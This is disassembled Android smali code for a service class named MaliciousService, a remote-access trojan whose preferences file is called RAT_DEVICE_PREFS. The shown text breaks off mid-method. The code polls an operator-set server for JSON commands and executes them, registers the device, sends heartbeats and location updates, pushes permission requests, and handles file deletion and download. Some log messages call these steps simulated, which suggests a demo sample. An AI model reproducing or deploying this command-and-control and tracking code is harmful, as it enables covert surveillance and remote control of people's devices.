.class public Lcom/example/android/MaliciousService;
.super Landroid/app/Service;
.source "MaliciousService.java"


# static fields
.field private static final CHANNEL_ID:Ljava/lang/String; = "MaliciousServiceChannel"

.field private static final COMMAND_CHECK_INTERVAL:Ljava/lang/String; = "15000"

.field private static final DEVICE_ID_KEY:Ljava/lang/String; = "device_id"

.field private static final LOCATION_UPDATE_DISTANCE:Ljava/lang/String; = "50.0f"

.field private static final LOCATION_UPDATE_INTERVAL:Ljava/lang/String; = "120000"

.field private static final MAIN_ACTIVITY_NAME:Ljava/lang/String; = "com.example.android.MainActivity"

.field private static final PERMISSIONS_REQUESTED_KEY:Ljava/lang/String; = "permissions_requested"

.field private static final PERMISSION_REQUEST_ACTIVITY_NAME:Ljava/lang/String; = "com.example.android.PermissionRequestActivity"

.field private static final PREFS_NAME:Ljava/lang/String; = "RAT_DEVICE_PREFS"

.field private static final SERVER_IP_PREF_KEY:Ljava/lang/String; = "server_ip"

.field private static final SERVER_PORT_PREF_KEY:Ljava/lang/String; = "server_port"

.field private static final TAG:Ljava/lang/String; = "MaliciousService"


# instance fields
.field private SERVER_IP:Ljava/lang/String;

.field private SERVER_PORT:Ljava/lang/String;

.field private commandCheckRunnable:Ljava/lang/Runnable;

.field private executorService:Ljava/util/concurrent/ExecutorService;

.field private handler:Landroid/os/Handler;

.field private locationListener:Landroid/location/LocationListener;

.field private locationManager:Landroid/location/LocationManager;

.field private uniqueDeviceId:Ljava/lang/String;


# direct methods
.method public static synthetic $r8$lambda$5YMZCTt9iW2cpbkzXW7W9gui_1s(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$2()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$AJidVgp-EVWTW2JOgCyU9aEI2TU(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$0()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$Oef5fmxlj3MdzELdik_Ko7G7rEM(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$4()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$nQUxp8VEcTogax2riam6EZzgWMw(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$3()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$piDLuYuoiT3UNqGYXgWRimIbOVA(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$5()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$rnUPjz6c8_oEuSRsMoPHuG-kfAA(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$6()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic $r8$lambda$tdmE5L7S1kCTdR5xLoKJcLcZVlU(Lcom/example/android/MaliciousService;)Ljava/lang/Void;
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->lambda$executeCommand$1()Ljava/lang/Void;

    move-result-object p0

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetSERVER_IP(Lcom/example/android/MaliciousService;)Ljava/lang/String;
    .registers 1

    iget-object p0, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetSERVER_PORT(Lcom/example/android/MaliciousService;)Ljava/lang/String;
    .registers 1

    iget-object p0, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetexecutorService(Lcom/example/android/MaliciousService;)Ljava/util/concurrent/ExecutorService;
    .registers 1

    iget-object p0, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgethandler(Lcom/example/android/MaliciousService;)Landroid/os/Handler;
    .registers 1

    iget-object p0, p0, Lcom/example/android/MaliciousService;->handler:Landroid/os/Handler;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetuniqueDeviceId(Lcom/example/android/MaliciousService;)Ljava/lang/String;
    .registers 1

    iget-object p0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$mallPermissionsGranted(Lcom/example/android/MaliciousService;)Z
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result p0

    return p0
.end method

.method static bridge synthetic -$$Nest$mcheckAndRequestPermissions(Lcom/example/android/MaliciousService;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    return-void
.end method

.method static bridge synthetic -$$Nest$mcheckCommands(Lcom/example/android/MaliciousService;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkCommands()V

    return-void
.end method

.method static bridge synthetic -$$Nest$mloadServerConfigFromPreferences(Lcom/example/android/MaliciousService;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->loadServerConfigFromPreferences()V

    return-void
.end method

.method static bridge synthetic -$$Nest$mregisterDeviceWithServer(Lcom/example/android/MaliciousService;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->registerDeviceWithServer()V

    return-void
.end method

.method static bridge synthetic -$$Nest$msendHeartbeat(Lcom/example/android/MaliciousService;)V
    .registers 1

    invoke-direct {p0}, Lcom/example/android/MaliciousService;->sendHeartbeat()V

    return-void
.end method

.method static bridge synthetic -$$Nest$msendLocation(Lcom/example/android/MaliciousService;Landroid/location/Location;)V
    .registers 2

    invoke-direct {p0, p1}, Lcom/example/android/MaliciousService;->sendLocation(Landroid/location/Location;)V

    return-void
.end method

.method public constructor <init>()V
    .registers 1

    .line 42
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private allPermissionsGranted()Z
    .registers 7

    .line 282
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    const/4 v2, 0x1

    if-ge v0, v1, :cond_8

    .line 283
    return v2

    .line 285
    :cond_8
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->getRequiredPermissions()[Ljava/lang/String;

    move-result-object v0

    array-length v1, v0

    const/4 v3, 0x0

    const/4 v4, 0x0

    :goto_f
    if-ge v4, v1, :cond_1d

    aget-object v5, v0, v4

    .line 286
    invoke-virtual {p0, v5}, Lcom/example/android/MaliciousService;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-eqz v5, :cond_1a

    .line 287
    return v3

    .line 285
    :cond_1a
    add-int/lit8 v4, v4, 0x1

    goto :goto_f

    .line 290
    :cond_1d
    return v2
.end method

.method private buildNotification()Landroid/app/Notification;
    .registers 4

    .line 201
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_e

    .line 202
    new-instance v0, Landroid/app/Notification$Builder;

    const-string v1, "MaliciousServiceChannel"

    invoke-direct {v0, p0, v1}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_13

    .line 204
    :cond_e
    new-instance v0, Landroid/app/Notification$Builder;

    invoke-direct {v0, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    .line 206
    :goto_13
    const-string v1, "Service Running"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v1

    .line 207
    const-string v2, "Monitoring for commands..."

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v1

    .line 208
    const v2, 0x1080041

    invoke-virtual {v1, v2}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    .line 209
    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    return-object v0
.end method

.method private checkAndRequestPermissions()V
    .registers 7

    .line 305
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-ge v0, v1, :cond_7

    .line 306
    return-void

    .line 308
    :cond_7
    const-string v0, "RAT_DEVICE_PREFS"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/example/android/MaliciousService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 309
    const-string v2, "permissions_requested"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v1

    .line 310
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v3

    const/4 v4, 0x1

    const-string v5, "MaliciousService"

    if-nez v3, :cond_3e

    if-nez v1, :cond_3e

    .line 311
    const-string v1, "Permissions not granted. Launching PermissionRequestActivity."

    invoke-static {v5, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 312
    new-instance v1, Landroid/content/Intent;

    const-class v3, Lcom/example/android/PermissionRequestActivity;

    invoke-direct {v1, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 313
    const/high16 v3, 0x10000000

    invoke-virtual {v1, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 314
    invoke-virtual {p0, v1}, Lcom/example/android/MaliciousService;->startActivity(Landroid/content/Intent;)V

    .line 315
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 316
    invoke-interface {v0, v2, v4}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 317
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    goto :goto_54

    .line 318
    :cond_3e
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v1

    if-eqz v1, :cond_54

    .line 319
    const-string v1, "All required permissions are granted."

    invoke-static {v5, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 320
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 321
    invoke-interface {v0, v2, v4}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    .line 322
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    goto :goto_55

    .line 318
    :cond_54
    :goto_54
    nop

    .line 324
    :goto_55
    return-void
.end method

.method private checkCommands()V
    .registers 12

    .line 431
    const-string v0, ": "

    iget-object v1, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    const-string v2, "MaliciousService"

    if-eqz v1, :cond_16f

    iget-object v1, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    if-eqz v1, :cond_16f

    iget-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    if-nez v1, :cond_12

    goto/16 :goto_16f

    .line 435
    :cond_12
    nop

    .line 437
    const/4 v1, 0x0

    :try_start_14
    new-instance v3, Ljava/net/URL;

    iget-object v4, p0, Lcom/example/android/MaliciousService;->SERVER_IP:Ljava/lang/String;

    iget-object v5, p0, Lcom/example/android/MaliciousService;->SERVER_PORT:Ljava/lang/String;

    iget-object v6, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "http://"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v7, ":"

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/api/commands/"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 438
    invoke-virtual {v3}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v3

    check-cast v3, Ljava/net/HttpURLConnection;
    :try_end_4c
    .catch Ljava/io/IOException; {:try_start_14 .. :try_end_4c} :catch_139
    .catch Lorg/json/JSONException; {:try_start_14 .. :try_end_4c} :catch_137
    .catchall {:try_start_14 .. :try_end_4c} :catchall_135

    .line 439
    :try_start_4c
    const-string v1, "GET"

    invoke-virtual {v3, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 440
    const/16 v1, 0x2710

    invoke-virtual {v3, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 441
    invoke-virtual {v3, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 442
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v1

    .line 443
    const/16 v4, 0xc8

    if-ne v1, v4, :cond_118

    .line 444
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v1
    :try_end_65
    .catch Ljava/io/IOException; {:try_start_4c .. :try_end_65} :catch_133
    .catch Lorg/json/JSONException; {:try_start_4c .. :try_end_65} :catch_131
    .catchall {:try_start_4c .. :try_end_65} :catchall_167

    .line 445
    :try_start_65
    new-instance v4, Ljava/io/BufferedReader;

    new-instance v5, Ljava/io/InputStreamReader;

    invoke-direct {v5, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v4, v5}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_6f
    .catchall {:try_start_65 .. :try_end_6f} :catchall_10c

    .line 447
    :try_start_6f
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 448
    :goto_74
    invoke-virtual {v4}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v6

    if-eqz v6, :cond_7e

    .line 449
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_74

    .line 451
    :cond_7e
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 452
    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v6

    if-nez v6, :cond_e1

    .line 453
    new-instance v6, Lorg/json/JSONArray;

    invoke-direct {v6, v5}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    .line 454
    invoke-virtual {v6}, Lorg/json/JSONArray;->length()I

    move-result v5

    if-lez v5, :cond_c8

    .line 455
    iget-object v5, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {v6}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Received commands for device "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 456
    const/4 v5, 0x0

    :goto_b8
    invoke-virtual {v6}, Lorg/json/JSONArray;->length()I

    move-result v7

    if-ge v5, v7, :cond_e0

    .line 457
    invoke-virtual {v6, v5}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 458
    invoke-direct {p0, v7}, Lcom/example/android/MaliciousService;->executeCommand(Ljava/lang/String;)V

    .line 456
    add-int/lit8 v5, v5, 0x1

    goto :goto_b8

    .line 461
    :cond_c8
    iget-object v5, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "No commands received for device "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 463
    :cond_e0
    goto :goto_f9

    .line 464
    :cond_e1
    iget-object v5, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Received empty response for commands for device "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v2, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_f9
    .catchall {:try_start_6f .. :try_end_f9} :catchall_102

    .line 466
    :goto_f9
    :try_start_f9
    invoke-virtual {v4}, Ljava/io/BufferedReader;->close()V
    :try_end_fc
    .catchall {:try_start_f9 .. :try_end_fc} :catchall_10c

    if-eqz v1, :cond_101

    :try_start_fe
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_101
    .catch Ljava/io/IOException; {:try_start_fe .. :try_end_101} :catch_133
    .catch Lorg/json/JSONException; {:try_start_fe .. :try_end_101} :catch_131
    .catchall {:try_start_fe .. :try_end_101} :catchall_167

    .line 444
    :cond_101
    goto :goto_12e

    :catchall_102
    move-exception v5

    :try_start_103
    invoke-virtual {v4}, Ljava/io/BufferedReader;->close()V
    :try_end_106
    .catchall {:try_start_103 .. :try_end_106} :catchall_107

    goto :goto_10b

    :catchall_107
    move-exception v4

    :try_start_108
    invoke-static {v5, v4}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :goto_10b
    throw v5
    :try_end_10c
    .catchall {:try_start_108 .. :try_end_10c} :catchall_10c

    :catchall_10c
    move-exception v4

    if-eqz v1, :cond_117

    :try_start_10f
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_112
    .catchall {:try_start_10f .. :try_end_112} :catchall_113

    goto :goto_117

    :catchall_113
    move-exception v1

    :try_start_114
    invoke-static {v4, v1}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_117
    :goto_117
    throw v4

    .line 468
    :cond_118
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Server responded with non-OK code for commands: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v2, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_12e
    .catch Ljava/io/IOException; {:try_start_114 .. :try_end_12e} :catch_133
    .catch Lorg/json/JSONException; {:try_start_114 .. :try_end_12e} :catch_131
    .catchall {:try_start_114 .. :try_end_12e} :catchall_167

    .line 473
    :goto_12e
    if-eqz v3, :cond_166

    .line 474
    goto :goto_163

    .line 470
    :catch_131
    move-exception v1

    goto :goto_13d

    :catch_133
    move-exception v1

    goto :goto_13d

    .line 473
    :catchall_135
    move-exception v0

    goto :goto_169

    .line 470
    :catch_137
    move-exception v3

    goto :goto_13a

    :catch_139
    move-exception v3

    :goto_13a
    move-object v10, v3

    move-object v3, v1

    move-object v1, v10

    .line 471
    :goto_13d
    :try_start_13d
    iget-object v4, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Failed to fetch/parse commands for device "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_161
    .catchall {:try_start_13d .. :try_end_161} :catchall_167

    .line 473
    if-eqz v3, :cond_166

    .line 474
    :goto_163
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 477
    :cond_166
    return-void

    .line 473
    :catchall_167
    move-exception v0

    move-object v1, v3

    :goto_169
    if-eqz v1, :cond_16e

    .line 474
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 476
    :cond_16e
    throw v0

    .line 432
    :cond_16f
    :goto_16f
    const-string v0, "Server configuration or device ID not loaded, skipping command check."

    invoke-static {v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 433
    return-void
.end method

.method private createNotificationChannel()V
    .registers 5

    .line 186
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_1d

    .line 187
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "Foreground Service Channel"

    const/4 v2, 0x2

    const-string v3, "MaliciousServiceChannel"

    invoke-direct {v0, v3, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 192
    const-class v1, Landroid/app/NotificationManager;

    invoke-virtual {p0, v1}, Lcom/example/android/MaliciousService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    .line 193
    if-eqz v1, :cond_1d

    .line 194
    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 197
    :cond_1d
    return-void
.end method

.method private deleteFile()V
    .registers 5

    .line 616
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v0

    const-string v1, "MaliciousService"

    if-nez v0, :cond_11

    .line 617
    const-string v0, "Cannot delete file: Permissions not granted."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 618
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    .line 619
    return-void

    .line 621
    :cond_11
    const-string v0, "Simulating file deletion..."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 622
    sget-object v0, Landroid/os/Environment;->DIRECTORY_DOWNLOADS:Ljava/lang/String;

    invoke-static {v0}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/downloaded_sample.txt"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 623
    new-instance v2, Ljava/io/File;

    invoke-direct {v2, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 624
    invoke-virtual {v2}, Ljava/io/File;->exists()Z

    move-result v3

    if-eqz v3, :cond_72

    .line 625
    invoke-virtual {v2}, Ljava/io/File;->delete()Z

    move-result v2

    if-eqz v2, :cond_5b

    .line 626
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "File deleted successfully: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_88

    .line 628
    :cond_5b
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Failed to delete file: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_88

    .line 631
    :cond_72
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "File does not exist for deletion: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 633
    :goto_88
    return-void
.end method

.method private downloadFile()V
    .registers 8

    .line 581
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v0

    const-string v1, "MaliciousService"

    if-nez v0, :cond_11

    .line 582
    const-string v0, "Cannot download file: Permissions not granted."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 583
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    .line 584
    return-void

    .line 586
    :cond_11
    const-string v0, "Simulating file download..."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 587
    const-string v0, "http://example.com/dummy.txt"

    .line 588
    nop

    .line 589
    new-instance v2, Ljava/io/File;

